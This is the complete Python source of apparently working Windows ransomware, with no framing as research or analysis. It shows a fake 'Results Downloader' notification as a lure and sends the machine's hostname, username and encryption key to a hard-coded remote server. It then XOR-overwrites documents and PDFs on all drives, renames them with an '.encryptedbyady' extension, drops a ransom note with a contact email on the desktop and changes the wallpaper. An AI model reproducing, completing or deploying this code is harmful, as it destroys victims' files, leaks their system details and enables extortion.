import os
import sys
import random
import socket
# from datetime import datetime
from threading import Thread
from queue import Queue
# import urllib.request
import ctypes
from plyer import notification
def resource_path(relative_path):
    # """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)

def notificate(title, message):
    notification.notify(
        title=title,
        message=message,
        app_icon=resource_path("notification.ico"),
        timeout=5,
    )
# Safeguard password
# safeguard=input("Enter safeguard password: ")
# if safeguard != 'start':
#     sys.exit()
# Generate Key
desk_path= os.environ['USERPROFILE']+'\\Desktop'
# notificate("Windows Update", "Installing updates in background.\nDon't turn off your PC. This may take a while.")
notificate("Results Downloader", "Fetching Results...\nPlease be patient. This may take a while.")
key=''
encryption_level=128//8
char_pool='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!"#$%&()*+,-./:;<=>?@[\]^_`{|}~\''
for i in range(encryption_level):
    key+=random.choice(char_pool)
# for i in range(0x00, 0xFF):
#     char_pool+=(chr(i))

hostname=os.getenv('COMPUTERNAME')
username=os.getenv('USERNAME')

#Connect to server
# ip_address=socket.gethostbyname("newupdate.twilightparadox.com")
ip_address='34.217.2.102'
port = 46969
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    while True:
        try:
            s.connect((ip_address,port))
            s.send(bytes(f'Encrypter: {hostname} - {username}: {key}', 'utf-8'))
            break
        except:
            continue
    decision=s.recv(1024).decode('utf-8')
    if decision=="no":
        sys.exit()
    elif decision=="yes":
        pass
    else:
        sys.exit()
# encrypted_ext=['.txt','.pdf','.xlsx','.xlsb','.xls','.ppt','.pptx','.pptm','.rtf','.doc','.docx','.jpg','.jpeg','.mp4','.mp3','.mkv','.avi','.png','.wav','.aac','.flac','.m4a']
encrypted_ext=['.txt','.pdf','.xlsx','.xlsb','.xls','.ppt','.pptx','.pptm','.rtf','.doc','.docx']
file_paths=[]

# Grab all files
Drives=[]
for drive_letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
        if os.path.exists(f'{drive_letter}:'):
            Drives.append(drive_letter+':\\')
        else:
            pass
for sk in Drives:
    for root, dirs, files in os.walk(sk):
        dirs[:] = [d for d in dirs if d!="Windows"]
        for file in files:
            file_path, file_ext=os.path.splitext(root+'\\'+file)
            if file_ext in encrypted_ext:
                file_paths.append(root+'\\'+file)

#Encrypt Files
def encrypt(key):
    while q.not_empty:
        file=q.get()
        index=0
        max_index=encryption_level-1
        try:
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'wb') as f:
                for byte in data:
                    xor_byte = byte ^ ord(key[index])
                    f.write(xor_byte.to_bytes(1, 'little'))
                if index>=max_index:
                    index=0
                else:
                    index+=1
            base,ext = os.path.splitext(file)
            os.rename(file, base +ext+ '.encryptedbyady')
            # print(f'Successfully encrypted: {file}')
        except:
            # print(f'Failed to encrypt: {file}')
            pass
        q.task_done()
q=Queue()
for file in file_paths:
    q.put(file)
for i in  range(30):
    thread =Thread(target=encrypt, args=(key,), daemon=True)
    thread.start()
q.join()
with open(desk_path+"\\"+"Read_me_encryptedbyady.txt",'w') as f:
    f.write("***Read me with caution!***\n\nYour files have been encrypted by ady!\n\n"
            "If you want your files back, contact ady at aadityasaini30@yahoo.com\n\n"
            "There is no way to recover your files, except contacting ady.\n\n"
            "This file is saved on your desktop for future reference.")
# def dl_img(image_url,image_path,image_name):
#     full_path=image_path+'\\'+image_name+'.jpg'
#     urllib.request.urlretrieve(image_url,full_path)
#     return full_path
# image_url="https://i.ibb.co/Jz0rfMn/ady1.jpg"
# image_name="View_me_encryptedbyady"
# sourc=dl_img(image_url,desk_path,image_name)
osCommandString = "cmd /c start /max notepad.exe "+desk_path+"\\"+"Read_me_encryptedbyady.txt"
os.system(osCommandString)
sourc=resource_path("Wallpaper_encryptedbyady.jpg")
SPI_WALLPAPER=0x14
SPIF_UPDATINGFILE=0x2
ctypes.windll.user32.SystemParametersInfoW(SPI_WALLPAPER,0,sourc,SPIF_UPDATINGFILE)
# os.remove(sys.argv[0])
# print("Encryption was successful!")

